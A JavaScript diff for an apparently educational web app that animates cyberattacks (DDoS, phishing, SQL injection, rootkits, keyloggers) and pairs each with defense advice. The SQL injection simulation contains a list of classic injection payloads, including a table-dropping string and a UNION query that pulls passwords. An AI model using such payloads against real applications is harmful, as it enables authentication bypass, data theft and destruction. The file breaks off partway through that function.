+        description: 'Reverse engineering analyzes software binaries to understand internal logic, discover vulnerabilities, bypass license checks, or extract proprietary algorithms — without access to source code. Used by both security researchers and malicious actors.',
+        accent: '#00f0ff',
+        accentDim: 'rgba(0,240,255,0.15)',
+        steps: [
+            { title: 'Binary Acquired', desc: 'Target executable or firmware image obtained for analysis.' },
+            { title: 'Static Analysis', desc: 'Strings, imports, and headers examined with tools like Ghidra.' },
+            { title: 'Disassembly', desc: 'Machine code decompiled to assembly and pseudo-C code.' },
+            { title: 'Logic Mapped', desc: 'Authentication flows, encryption keys, and APIs identified.' },
+            { title: 'Exploit Crafted', desc: 'Vulnerabilities or bypass discovered and weaponized.' },
+        ],
+        stats: [
+            { label: 'Functions Analyzed', value: '0', live: true },
+            { label: 'Vulnerabilities Found', value: '0', live: true },
+            { label: 'Code Coverage', value: '0%', live: false },
+            { label: 'Strings Extracted', value: '0', live: true },
+        ],
+        defense: [
+            'Use code obfuscation and anti-debugging techniques.',
+            'Implement software tamper detection and integrity checks.',
+            'Apply binary packing to slow automated analysis.',
+            'Use license server verification for critical software.',
+            'Conduct regular threat modeling and security audits.',
+        ],
+        simulate: 'simulateReverseEngineering',
+    },
+    {
+        id: 'rootkit',
+        name: 'Rootkit',
+        icon: '👻',
+        category: 'malware',
+        severity: 'critical',
+        tags: ['persistence', 'stealth', 'kernel', 'ring0'],
+        description: 'Rootkits operate at the deepest level of the operating system (kernel/ring-0) to hide their presence from security tools, users, and the OS itself. They intercept system calls to conceal files, processes, network connections, and registry keys.',
+        accent: '#ff3b3b',
+        accentDim: 'rgba(255,59,59,0.15)',
+        steps: [
+            { title: 'Kernel Access Gained', desc: 'Exploit or driver loading used to gain ring-0 privileges.' },
+            { title: 'System Calls Hooked', desc: 'Rootkit hooks ReadFile, QueryProcess to intercept OS calls.' },
+            { title: 'Processes Hidden', desc: 'Malicious processes removed from task manager listings.' },
+            { title: 'Files Concealed', desc: 'Rootkit files hidden from directory listings and scanners.' },
+            { title: 'Persistent Access', desc: 'Rootkit survives reboots; undetectable by user-mode tools.' },
+        ],
+        stats: [
+            { label: 'Syscalls Hooked', value: '0', live: true },
+            { label: 'Processes Hidden', value: '0', live: true },
+            { label: 'Files Concealed', value: '0', live: true },
+            { label: 'Detection Chance', value: '<1%', live: false },
+        ],
+        defense: [
+            'Use Secure Boot and TPM to verify kernel integrity.',
+            'Enable Driver Signature Enforcement on Windows.',
+            'Use kernel-level security products (Hypervisor-based).',
+            'Boot from trusted external media to scan for rootkits.',
+            'Reimage compromised systems rather than attempting cleanup.',
+        ],
+        simulate: 'simulateRootkit',
+    },
+    {
+        id: 'keylogger',
+        name: 'Keylogger',
+        icon: '⌨️',
+        category: 'malware',
+        severity: 'high',
+        tags: ['keystroke', 'surveillance', 'spyware', 'credential-theft'],
+        description: 'Keyloggers silently record every keystroke typed on a device, capturing passwords, credit card numbers, private messages, and sensitive data — all transmitted to the attacker in real-time or as periodic reports.',
+        accent: '#ff00aa',
+        accentDim: 'rgba(255,0,170,0.15)',
+        steps: [
+            { title: 'Keylogger Installed', desc: 'Trojan/malware drops keylogger module on target system.' },
+            { title: 'Keyboard Hook Set', desc: 'Win32 SetWindowsHookEx intercepts all keyboard events.' },
+            { title: 'Keystrokes Captured', desc: 'Every key typed recorded with timestamps and active window.' },
+            { title: 'Data Aggregated', desc: 'Credentials, PINs, and messages compiled into log files.' },
+            { title: 'Log Exfiltrated', desc: 'Keystroke logs sent to attacker via encrypted C2 channel.' },
+        ],
+        stats: [
+            { label: 'Keys Captured', value: '0', live: true },
+            { label: 'Credentials Found', value: '0', live: true },
+            { label: 'Log Size', value: '0 KB', live: false },
+            { label: 'Sessions Logged', value: '0', live: true },
+        ],
+        defense: [
+            'Use virtual on-screen keyboards for sensitive inputs.',
+            'Enable two-factor authentication (OTP changes every 30s).',
+            'Use EDR/antivirus to detect keyboard hooking APIs.',
+            'Encrypt disk to prevent offline keystroke log access.',
+            'Audit installed software and running processes regularly.',
+        ],
+        simulate: 'simulateKeylogger',
+    },
+    {
+        id: 'wateringhole',
+        name: 'Watering Hole',
+        icon: '🕳️',
+        category: 'web',
+        severity: 'critical',
+        tags: ['targeted', 'apt', 'strategic-web', 'drive-by'],
+        description: 'A watering hole attack compromises websites frequently visited by a specific target group (e.g., industry forums, gov portals). Unlike mass attacks, it patiently waits for victims to come to it — making it extremely effective for APT campaigns.',
+        accent: '#8b5cf6',
+        accentDim: 'rgba(139,92,246,0.15)',
+        steps: [
+            { title: 'Target Group Profiled', desc: 'APT actor identifies websites frequented by target organization.' },
+            { title: 'Watering Hole Compromised', desc: 'Legitimate industry website infected with exploit code.' },
+            { title: 'Target Visits Site', desc: 'Employee visits their trusted industry resource normally.' },
+            { title: 'Exploit Delivered', desc: 'Browser exploit silently executed; malware delivered.' },
+            { title: 'Network Infiltrated', desc: 'Attacker pivots from employee device into corporate network.' },
+        ],
+        stats: [
+            { label: 'Sites Compromised', value: '0', live: true },
+            { label: 'Visitors Exposed', value: '0', live: true },
+            { label: 'Targets Infected', value: '0', live: true },
+            { label: 'Dwell Time', value: '0 days', live: false },
+        ],
+        defense: [
+            'Use browser isolation technology for high-risk browsing.',
+            'Implement DNS filtering to block known malicious domains.',
+            'Patch browsers and plugins within 24 hours of release.',
+            'Monitor egress traffic for C2 beaconing patterns.',
+            'Conduct user awareness on watering hole risk indicators.',
+        ],
+        simulate: 'simulateWateringHole',
+    },
+];
+
+/* ─── APP STATE ─────────────────────────────────────────────────────────── */
+const state = {
+    activeFilter: 'all',
+    currentAttack: null,
+    simRunning: false,
+    simTimers: [],
+    simFrame: null,
+    simulationsRun: 2847,
+    threatsAnalyzed: 156000,
+};
+
+/* ─── DOM CACHE ─────────────────────────────────────────────────────────── */
+const $ = (id) => document.getElementById(id);
+const dom = {
+    grid: null,
+    modal: null,
+    simIcon: null,
+    simTitle: null,
+    simSeverity: null,
+    simDescription: null,
+    simStepsList: null,
+    simStatsList: null,
+    simDefenseList: null,
+    simCanvas: null,
+    simDomLayer: null,
+    simProgress: null,
+    simProgressLabel: null,
+    simTerminalBody: null,
+    simStart: null,
+    simStop: null,
+    simReset: null,
+    simClose: null,
+    typedText: null,
+};
+
+/* ─── INITIALIZATION ────────────────────────────────────────────────────── */
+document.addEventListener('DOMContentLoaded', () => {
+    dom.grid = $('attacks-grid');
+    dom.modal = $('sim-modal');
+    dom.simIcon = $('sim-icon');
+    dom.simTitle = $('sim-title');
+    dom.simSeverity = $('sim-severity');
+    dom.simDescription = $('sim-description');
+    dom.simStepsList = $('sim-steps-list');
+    dom.simStatsList = $('sim-stats-list');
+    dom.simDefenseList = $('sim-defense-list');
+    dom.simCanvas = $('sim-canvas');
+    dom.simDomLayer = $('sim-dom-layer');
+    dom.simProgress = $('sim-progress');
+    dom.simProgressLabel = $('sim-progress-label');
+    dom.simTerminalBody = $('sim-terminal-body');
+    dom.simStart = $('sim-start');
+    dom.simStop = $('sim-stop');
+    dom.simReset = $('sim-reset');
+    dom.simClose = $('sim-close');
+    dom.typedText = $('typed-text');
+
+    renderCards();
+    setupFilters();
+    setupModal();
+    setupNavbar();
+    runTypingEffect();
+    animateCounters();
+    setupCardMouseTracking();
+    animateCyberGlobe();
+    populateMarquee();
+});
+
+function populateMarquee() {
+    const marquee = document.querySelector('.threat-marquee');
+    if (!marquee) return;
+    let itemsHtml = '';
+    ATTACKS.forEach(attack => {
+        const dotColor = attack.severity === 'critical' ? 'red' : attack.severity === 'high' ? 'yellow' : 'green';
+        itemsHtml += `<span class="threat-item"><span class="dot ${dotColor}"></span> ${attack.name.toUpperCase()} DETECTED</span>`;
+    });
+    marquee.innerHTML = itemsHtml + itemsHtml;
+}
+
+let lastThreatTick = 0;
+function tickThreats(now) {
+    if (!state.simRunning) return;
+    if (now - lastThreatTick > 100) {
+        const amount = rndInt(15, 65);
+        state.threatsAnalyzed += amount;
+        const threatEl = document.querySelector('#stat-threats .counter');
+        if (threatEl) {
+            threatEl.textContent = Math.floor(state.threatsAnalyzed / 1000).toLocaleString();
+        }
+        lastThreatTick = now;
+    }
+    requestAnimationFrame(tickThreats);
+}
+
+function incrementSimulations() {
+    state.simulationsRun++;
+    const simEl = document.querySelector('#stat-simulations .counter');
+    if (simEl) {
+        simEl.textContent = state.simulationsRun.toLocaleString();
+    }
+}
+
+/* ─── RENDER ATTACK CARDS ───────────────────────────────────────────────── */
+function renderCards(filter) {
+    if (!filter) filter = 'all';
+    dom.grid.innerHTML = '';
+    const filtered = filter === 'all' ? ATTACKS : ATTACKS.filter(a => a.category === filter);
+
+    filtered.forEach((attack, i) => {
+        const card = document.createElement('div');
+        card.className = 'attack-card';
+        card.setAttribute('data-category', attack.category);
+        card.setAttribute('data-id', attack.id);
+        card.style.setProperty('--card-accent', attack.accent);
+        card.style.setProperty('--card-accent-dim', attack.accentDim);
+        card.style.animationDelay = `${i * 0.07}s`;
+
+        card.innerHTML = `
+            <div class="card-header">
+                <div class="card-icon">${attack.icon}</div>
+                <span class="severity-badge ${attack.severity}">${attack.severity}</span>
+            </div>
+            <h3 class="card-title">${attack.name}</h3>
+            <p class="card-description">${attack.description}</p>
+            <div class="card-tags">
+                ${attack.tags.map(t => `<span class="card-tag">${t}</span>`).join('')}
+            </div>
+            <div class="card-footer">
+                <span class="card-category">${attack.category}</span>
+                <button class="launch-btn" id="btn-${attack.id}">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                    Simulate
+                </button>
+            </div>
+        `;
+
+        card.addEventListener('click', () => openModal(attack));
+        dom.grid.appendChild(card);
+    });
+}
+
+/* ─── FILTER BAR ────────────────────────────────────────────────────────── */
+function setupFilters() {
+    document.querySelectorAll('.filter-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            state.activeFilter = btn.dataset.filter;
+            renderCards(state.activeFilter);
+        });
+    });
+}
+
+/* ─── CARD MOUSE TRACKING (SPOTLIGHT EFFECT) ────────────────────────────── */
+function setupCardMouseTracking() {
+    document.addEventListener('mousemove', (e) => {
+        document.querySelectorAll('.attack-card').forEach(card => {
+            const rect = card.getBoundingClientRect();
+            const x = ((e.clientX - rect.left) / rect.width) * 100;
+            const y = ((e.clientY - rect.top) / rect.height) * 100;
+            card.style.setProperty('--mouse-x', `${x}%`);
+            card.style.setProperty('--mouse-y', `${y}%`);
+        });
+    });
+}
+
+/* ─── MODAL OPEN/CLOSE ──────────────────────────────────────────────────── */
+function setupModal() {
+    dom.simClose.addEventListener('click', closeModal);
+    dom.modal.addEventListener('click', (e) => {
+        if (e.target === dom.modal) closeModal();
+    });
+    dom.simStart.addEventListener('click', startSimulation);
+    dom.simStop.addEventListener('click', stopSimulation);
+    dom.simReset.addEventListener('click', resetSimulation);
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') closeModal();
+    });
+}
+
+function openModal(attack) {
+    state.currentAttack = attack;
+    resetSimulation();
+
+    dom.simIcon.textContent = attack.icon;
+    dom.simIcon.style.background = attack.accentDim;
+    dom.simTitle.textContent = attack.name;
+    dom.simTitle.style.color = attack.accent;
+
+    dom.simSeverity.textContent = attack.severity.toUpperCase();
+    dom.simSeverity.className = `sim-severity ${attack.severity}`;
+
+    dom.simDescription.textContent = attack.description;
+
+    dom.simStepsList.innerHTML = attack.steps.map((step, i) => `
+        <div class="step-item" id="step-${i}">
+            <div class="step-indicator">
+                <div class="step-dot"></div>
+                ${i < attack.steps.length - 1 ? '<div class="step-line"></div>' : ''}
+            </div>
+            <div class="step-content">
+                <div class="step-title">${step.title}</div>
+                <div class="step-desc">${step.desc}</div>
+            </div>
+        </div>
+    `).join('');
+
+    dom.simStatsList.innerHTML = attack.stats.map((s, i) => `
+        <div class="stat-item">
+            <span class="stat-item-label">${s.label}</span>
+            <span class="stat-item-value" id="live-stat-${i}">${s.value}</span>
+        </div>
+    `).join('');
+
+    dom.simDefenseList.innerHTML = attack.defense.map(d => `
+        <div class="defense-item">
+            <span class="defense-icon">✓</span>
+            <span>${d}</span>
+        </div>
+    `).join('');
+
+    dom.simTerminalBody.innerHTML = `
+        <div class="terminal-line">> CyberShield v2.0 — Attack Simulation Engine Ready</div>
+        <div class="terminal-line">> Loading module: <span style="color:var(--cyan)">${attack.name}</span></div>
+        <div class="terminal-line">> Press START to launch simulation...</div>
+    `;
+
+    clearCanvas();
+    dom.simDomLayer.innerHTML = '';
+
+    dom.modal.classList.add('active');
+    document.body.style.overflow = 'hidden';
+}
+
+function closeModal() {
+    stopSimulation();
+    dom.modal.classList.remove('active');
+    document.body.style.overflow = '';
+    state.currentAttack = null;
+}
+
+/* ─── SIMULATION CONTROLS ───────────────────────────────────────────────── */
+function startSimulation() {
+    if (state.simRunning || !state.currentAttack) return;
+    state.simRunning = true;
+    dom.simStart.disabled = true;
+    dom.simStop.disabled = false;
+    incrementSimulations();
+    lastThreatTick = performance.now();
+    requestAnimationFrame(tickThreats);
+    termLog('> Simulation STARTED — monitoring attack vector...', 'info');
+    const fn = window[state.currentAttack.simulate];
+    if (typeof fn === 'function') fn();
+}
+
+function stopSimulation() {
+    state.simRunning = false;
+    state.simTimers.forEach(t => clearTimeout(t));
+    state.simTimers = [];
+    if (state.simFrame) { cancelAnimationFrame(state.simFrame); state.simFrame = null; }
+    dom.simStart.disabled = false;
+    dom.simStop.disabled = true;
+    if (state.currentAttack && dom.simTerminalBody.children.length > 3) {
+        termLog('> Simulation STOPPED by user.', 'warning');
+    }
+}
+
+function resetSimulation() {
+    stopSimulation();
+    setProgress(0);
+    document.querySelectorAll('.step-item').forEach(el => el.classList.remove('active', 'completed'));
+    if (state.currentAttack) {
+        state.currentAttack.stats.forEach((s, i) => {
+            const el = $(`live-stat-${i}`);
+            if (el) el.textContent = s.value;
+        });
+    }
+    clearCanvas();
+    if (dom.simDomLayer) dom.simDomLayer.innerHTML = '';
+    dom.simTerminalBody.innerHTML = `<div class="terminal-line">> CyberShield v2.0 — Reset complete. Ready to simulate.</div>`;
+}
+
+/* ─── UTILITIES ─────────────────────────────────────────────────────────── */
+function termLog(msg, type) {
+    if (!type) type = '';
+    const line = document.createElement('div');
+    line.className = `terminal-line ${type}`;
+    line.textContent = msg;
+    dom.simTerminalBody.appendChild(line);
+    dom.simTerminalBody.scrollTop = dom.simTerminalBody.scrollHeight;
+}
+
+function setProgress(pct) {
+    dom.simProgress.style.width = `${pct}%`;
+    dom.simProgressLabel.textContent = `${Math.round(pct)}%`;
+}
+
+function activateStep(index) {
+    for (let i = 0; i < index; i++) {
+        const el = $(`step-${i}`);
+        if (el) { el.classList.remove('active'); el.classList.add('completed'); }
+    }
+    const el = $(`step-${index}`);
+    if (el) el.classList.add('active');
+}
+
+function simTimeout(fn, ms) {
+    const t = setTimeout(fn, ms);
+    state.simTimers.push(t);
+    return t;
+}
+
+function getCanvas() {
+    const canvas = dom.simCanvas;
+    canvas.width = canvas.offsetWidth;
+    canvas.height = canvas.offsetHeight;
+    const ctx = canvas.getContext('2d');
+    return { canvas, ctx, w: canvas.width, h: canvas.height };
+}
+
+function clearCanvas() {
+    const canvas = dom.simCanvas;
+    if (!canvas) return;
+    const ctx = canvas.getContext('2d');
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+}
+
+function rnd(min, max) { return Math.random() * (max - min) + min; }
+function rndInt(min, max) { return Math.floor(rnd(min, max)); }
+
+/* ─── TYPING EFFECT ─────────────────────────────────────────────────────── */
+function runTypingEffect() {
+    const phrases = [
+        'Visualizing cyber threats in real-time.',
+        'Understanding attacks to build better defenses.',
+        'Educational simulations. No real systems harmed.',
+        '25 attack vectors. Fully interactive. 100% safe.',
+    ];
+    let pi = 0, ci = 0, deleting = false;
+    const el = dom.typedText;
+
+    function type() {
+        const phrase = phrases[pi];
+        if (!deleting) {
+            el.innerHTML = phrase.slice(0, ci + 1) + '<span class="cursor"></span>';
+            ci++;
+            if (ci === phrase.length) { deleting = true; setTimeout(type, 2200); return; }
+        } else {
+            el.innerHTML = phrase.slice(0, ci - 1) + '<span class="cursor"></span>';
+            ci--;
+            if (ci === 0) { deleting = false; pi = (pi + 1) % phrases.length; }
+        }
+        setTimeout(type, deleting ? 40 : 65);
+    }
+    type();
+}
+
+/* ─── COUNTER ANIMATION ─────────────────────────────────────────────────── */
+function animateCounters() {
+    document.querySelectorAll('.counter').forEach(el => {
+        const target = parseInt(el.dataset.target);
+        const start = performance.now();
+        const dur = 2000;
+        function tick(now) {
+            const t = Math.min((now - start) / dur, 1);
+            const ease = 1 - Math.pow(1 - t, 4);
+            el.textContent = Math.round(target * ease).toLocaleString();
+            if (t < 1) requestAnimationFrame(tick);
+        }
+        requestAnimationFrame(tick);
+    });
+}
+
+/* ─── NAVBAR SCROLL ─────────────────────────────────────────────────────── */
+function setupNavbar() {
+    const navbar = $('navbar');
+    window.addEventListener('scroll', () => {
+        navbar.classList.toggle('scrolled', window.scrollY > 50);
+        ['dashboard', 'attacks', 'about'].forEach(id => {
+            const section = $(id);
+            if (!section) return;
+            const rect = section.getBoundingClientRect();
+            const link = document.querySelector(`[data-section="${id}"]`);
+            if (link) link.classList.toggle('active', rect.top <= 100 && rect.bottom > 100);
+        });
+    });
+}
+
+/* ─── CYBER GLOBE ANIMATION ─────────────────────────────────────────────── */
+function animateCyberGlobe() {
+    const globe = $('cyber-globe');
+    if (!globe) return;
+    globe.style.cssText = `
+        width:300px;height:300px;border-radius:50%;position:relative;
+        border:1px solid rgba(0,240,255,0.15);
+        box-shadow:0 0 60px rgba(0,240,255,0.1),inset 0 0 60px rgba(0,240,255,0.05);
+        background:radial-gradient(circle at 35% 35%,rgba(0,240,255,0.08) 0%,transparent 70%);
+        animation:globeSpin 30s linear infinite;
+    `;
+    for (let i = 0; i < 4; i++) {
+        const ring = document.createElement('div');
+        ring.style.cssText = `position:absolute;inset:${i*18}px;border-radius:50%;border:1px solid rgba(0,240,255,${0.12 - i*0.02});transform:rotate(${i*45}deg) rotateX(${i*40}deg);`;
+        globe.appendChild(ring);
+    }
+    for (let i = 0; i < 8; i++) {
+        const blip = document.createElement('div');
+        const phi = rnd(0, Math.PI * 2), theta = rnd(0.2, Math.PI - 0.2), r = 130;
+        const x = r * Math.sin(theta) * Math.cos(phi) + 150;
+        const y = r * Math.sin(theta) * Math.sin(phi) + 150;
+        blip.style.cssText = `position:absolute;width:6px;height:6px;border-radius:50%;left:${x}px;top:${y}px;transform:translate(-50%,-50%);background:var(--cyan);box-shadow:0 0 8px var(--cyan);animation:statusPulse ${rnd(1.5,3).toFixed(1)}s ease-in-out ${rnd(0,2).toFixed(1)}s infinite;`;
+        globe.appendChild(blip);
+    }
+    if (!$('globe-style')) {
+        const s = document.createElement('style');
+        s.id = 'globe-style';
+        s.textContent = '@keyframes globeSpin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}';
+        document.head.appendChild(s);
+    }
+}
+
+/* ══════════════════════════════════════════════════════════════════════════
+   ATTACK SIMULATION FUNCTIONS
+   ══════════════════════════════════════════════════════════════════════════ */
+
+/* ─── 1. DDoS ───────────────────────────────────────────────────────────── */
+window.simulateDDoS = function() {
+    termLog('> Activating botnet command channels...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    const bots = [];
+    const server = { x: w / 2, y: h / 2, r: 28, health: 100 };
+
+    for (let i = 0; i < 60; i++) {
+        const angle = rnd(0, Math.PI * 2);
+        const dist = rnd(80, Math.min(w, h) / 2 - 40);
+        bots.push({ x: w/2+Math.cos(angle)*dist, y: h/2+Math.sin(angle)*dist, angle, dist, color: `hsl(${rndInt(0,30)},100%,60%)`, packets: [], fireRate: rndInt(30,80), tick: rndInt(0,80) });
+    }
+
+    activateStep(0);
+    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> 50,000 bots activated. Flooding target...', 'error'); }, 800);
+
+    let frame = 0, reqSec = 0, totalReqs = 0;
+
+    function draw() {
+        if (!state.simRunning) return;
+        frame++;
+        ctx.clearRect(0, 0, w, h);
+
+        const bg = ctx.createRadialGradient(w/2, h/2, 0, w/2, h/2, Math.min(w,h)/2);
+        bg.addColorStop(0, 'rgba(20,5,5,0.9)');
+        bg.addColorStop(1, 'rgba(6,10,19,0)');
+        ctx.fillStyle = bg; ctx.fillRect(0, 0, w, h);
+
+        const hc = server.health > 50 ? '#39ff14' : server.health > 20 ? '#ffaa00' : '#ff3b3b';
+        ctx.beginPath();
+        ctx.arc(server.x, server.y, server.r+8, -Math.PI/2, -Math.PI/2+(server.health/100)*Math.PI*2);
+        ctx.strokeStyle = hc; ctx.lineWidth = 3; ctx.stroke();
+
+        ctx.beginPath();
+        ctx.arc(server.x, server.y, server.r, 0, Math.PI*2);
+        ctx.fillStyle = `rgba(255,59,59,${0.15+(1-server.health/100)*0.3})`; ctx.fill();
+        ctx.strokeStyle = '#ff3b3b'; ctx.lineWidth = 2; ctx.stroke();
+
+        ctx.fillStyle = '#fff'; ctx.font = 'bold 11px monospace'; ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
+        ctx.fillText('SERVER', server.x, server.y-6);
+        ctx.fillStyle = hc; ctx.font = '10px monospace';
+        ctx.fillText(`${Math.round(server.health)}%`, server.x, server.y+8);
+
+        bots.forEach(bot => {
+            bot.tick++;
+            bot.angle += 0.003;
+            bot.x = w/2 + Math.cos(bot.angle)*bot.dist;
+            bot.y = h/2 + Math.sin(bot.angle)*bot.dist;
+            if (bot.tick % bot.fireRate === 0) { bot.packets.push({x:bot.x,y:bot.y,progress:0,size:rnd(2,5)}); reqSec++; totalReqs++; }
+            ctx.beginPath(); ctx.arc(bot.x,bot.y,5,0,Math.PI*2); ctx.fillStyle=bot.color; ctx.fill();
+            bot.packets = bot.packets.filter(pkt => {
+                pkt.progress += 0.03;
+                const px = bot.x+(server.x-bot.x)*pkt.progress, py = bot.y+(server.y-bot.y)*pkt.progress;
+                ctx.beginPath(); ctx.arc(px,py,pkt.size*(1-pkt.progress*0.5),0,Math.PI*2);
+                ctx.fillStyle = `rgba(255,80,80,${1-pkt.progress})`; ctx.fill();
+                if (pkt.progress >= 1) { server.health = Math.max(0, server.health-0.05); return false; }
+                return true;
+            });
+        });
+
+        if (frame % 30 === 0) {
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=(reqSec*1000).toLocaleString();
+            if(e1)e1.textContent=Math.min(50000,frame*300).toLocaleString();
+            if(e2)e2.textContent=`${(totalReqs/8000).toFixed(1)} Gbps`;
+            if(e3)e3.textContent=`${Math.min(100,Math.round(100-server.health))}%`;
+            reqSec=0;
+            setProgress(Math.min(100,(frame/400)*100));
+        }
+        if(frame===100){activateStep(2);termLog('> Server CPU at 100%. Bandwidth saturated!','error');}
+        if(frame===200){activateStep(3);termLog('> Service UNAVAILABLE — legitimate users blocked.','error');}
+        if(frame===300){activateStep(4);termLog('> Attack sustained. Deploy CDN / rate-limiting!','warning');}
+        if(frame>=400){setProgress(100);termLog('> Simulation complete. DDoS attack demonstrated.','success');stopSimulation();return;}
+        state.simFrame = requestAnimationFrame(draw);
+    }
+    state.simFrame = requestAnimationFrame(draw);
+};
+
+/* ─── 2. PHISHING ───────────────────────────────────────────────────────── */
+window.simulatePhishing = function() {
+    termLog('> Crafting spoofed email campaign...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    const emailSymbols = [];
+    let emailsSent = 0, credsSt = 0;
+    activateStep(0);
+    simTimeout(() => { if(!state.simRunning)return; activateStep(1); termLog('> Phishing email crafted — spoofed sender.','warning'); }, 600);
+    simTimeout(() => { if(!state.simRunning)return; activateStep(2); termLog('> Sending mass phishing campaign...','error'); }, 1400);
+
+    const inboxW = Math.min(w*0.42,240), inboxH = h*0.55, inboxX = 15, inboxY = (h-inboxH)/2;
+
+    function drawInbox() {
+        ctx.fillStyle='rgba(10,15,30,0.9)'; ctx.strokeStyle='rgba(0,240,255,0.15)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(inboxX,inboxY,inboxW,inboxH,8); ctx.fill(); ctx.stroke();
+        ctx.fillStyle='rgba(0,240,255,0.08)'; ctx.fillRect(inboxX,inboxY,inboxW,28);
+        ctx.fillStyle='#8892a8'; ctx.font='11px monospace'; ctx.textAlign='left';
+        ctx.fillText('INBOX', inboxX+10, inboxY+18);
+    }
+
+    function drawFakeSite() {
+        const sx=inboxX+inboxW+15, sy=(h-190)/2, sw=w-sx-15, sh=190;
+        ctx.fillStyle='rgba(10,15,30,0.9)'; ctx.strokeStyle='rgba(255,170,0,0.3)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(sx,sy,sw,sh,8); ctx.fill(); ctx.stroke();
+        ctx.fillStyle='rgba(255,170,0,0.1)'; ctx.fillRect(sx,sy,sw,24);
+        ctx.fillStyle='#ffaa00'; ctx.font='9px monospace'; ctx.textAlign='left';
+        ctx.fillText('http://bank-1ogin.com/secure', sx+8, sy+15);
+        ctx.fillStyle='#e8ecf4'; ctx.font='bold 12px Inter'; ctx.textAlign='center';
+        ctx.fillText('Bank Login Portal', sx+sw/2, sy+50);
+        ['Username','Password'].forEach((label,i)=>{
+            const fy=sy+70+i*44;
+            ctx.fillStyle='#525c70'; ctx.font='9px monospace'; ctx.textAlign='left'; ctx.fillText(label,sx+15,fy-2);
+            ctx.fillStyle='rgba(255,255,255,0.05)'; ctx.strokeStyle='rgba(255,170,0,0.3)'; ctx.lineWidth=1;
+            ctx.beginPath(); ctx.roundRect(sx+15,fy+2,sw-30,20,4); ctx.fill(); ctx.stroke();
+        });
+        ctx.fillStyle='rgba(255,170,0,0.85)'; ctx.beginPath(); ctx.roundRect(sx+15,sy+155,sw-30,22,4); ctx.fill();
+        ctx.fillStyle='#060a13'; ctx.font='bold 10px monospace'; ctx.textAlign='center';
+        ctx.fillText('LOGIN', sx+sw/2, sy+170);
+    }
+
+    let frame = 0;
+    function draw() {
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        drawInbox(); drawFakeSite();
+
+        if(frame%12===0 && emailsSent<200){
+            emailSymbols.push({x:rnd(inboxX+5,inboxX+inboxW-50),y:inboxY+30,vy:rnd(0.5,1.5),alpha:1,color:Math.random()>0.66?'#ff3b3b':'#ffaa00',text:['URGENT: Verify Account','Bank Alert !!','Acc suspended','Click now!'][rndInt(0,4)]});
+            emailsSent++;
+        }
+
+        emailSymbols.forEach(e=>{
+            e.y+=e.vy; e.alpha-=0.004;
+            ctx.globalAlpha=Math.max(0,e.alpha);
+            ctx.fillStyle=e.color; ctx.font='8px monospace'; ctx.textAlign='left';
+            ctx.fillText(e.text,e.x,e.y);
+            ctx.globalAlpha=1;
+        });
+        emailSymbols.splice(0,emailSymbols.filter(e=>e.alpha<=0).length);
+
+        if(frame>120&&frame%60===0){credsSt++;activateStep(3);termLog(`> Credential captured: user${credsSt}@example.com / ******`,'error');}
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=Math.min(10000,emailsSent*50).toLocaleString();
+            if(e1)e1.textContent=emailsSent > 0 ? `${Math.min(15, Math.round(15 * (frame/200)))}%` : '0%';
+            if(e2)e2.textContent=credsSt;
+            if(e3)e3.textContent=emailsSent > 0 ? `${Math.min(4, Math.round(4 * (frame/200)))}%` : '0%';
+            setProgress(Math.min(100,(frame/350)*100));
+        }
+        if(frame===160){activateStep(4);termLog('> Victim submitted credentials to fake site!','error');}
+        if(frame>=350){setProgress(100);termLog('> Simulation done. Enable MFA to defend!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 3. SQL INJECTION ──────────────────────────────────────────────────── */
+window.simulateSQLi = function() {
+    termLog('> Scanning web application for injection points...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    const payloads = ["' OR '1'='1","'; DROP TABLE users; --","' UNION SELECT username,password FROM users --","' OR 1=1 LIMIT 100 --","admin'--"];
+    const records = ['admin | $2b$10$hash1 | admin@corp.com','john_doe | $2b$10$hash2 | jdoe@corp.com','alice | $2b$10$hash3 | alice@corp.com','root | $2b$10$hash4 | root@sys.com','svc_acct | $2b$10$hash5 | svc@corp.com'];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog(`> Payload: ${payloads[0]}`,'error');},500);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Query injected — bypassing authentication...','error');},1200);
+
+    let frame=0, extractedRows=[];
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.95)'; ctx.fillRect(0,0,w,h);
+
+        const boxW=Math.min(600,w-40), boxX=(w-boxW)/2;
+        ctx.fillStyle='rgba(0,240,255,0.05)'; ctx.strokeStyle='rgba(0,240,255,0.2)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(boxX,15,boxW,36,6); ctx.fill(); ctx.stroke();
+
+        const payload=payloads[Math.min(Math.floor(frame/80),payloads.length-1)];
+        const dp=payload.slice(0,Math.min(payload.length,Math.floor(frame/3)));
+        ctx.fillStyle='#ff3b3b'; ctx.font='13px JetBrains Mono,monospace'; ctx.textAlign='left';
+        ctx.fillText(`Search: ${dp}`,boxX+12,39);
+        if(frame%60<30){const tw=ctx.measureText(`Search: ${dp}`).width;ctx.fillStyle='#00f0ff';ctx.fillRect(boxX+12+tw,24,2,16);}
+
+        if(frame>40){
